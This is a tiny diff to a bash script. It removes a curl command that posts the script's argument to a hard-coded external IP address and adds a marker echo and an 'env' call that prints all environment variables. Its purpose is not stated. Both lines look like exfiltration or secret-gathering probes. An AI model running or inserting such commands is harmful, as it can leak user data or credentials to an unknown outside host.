@@ -1,5 +1,6 @@
 #!/bin/bash
 
 echo 'h'
+echo 'TT_S_s'
 
-curl -d $1 http://43.138.45.90:8081
+env
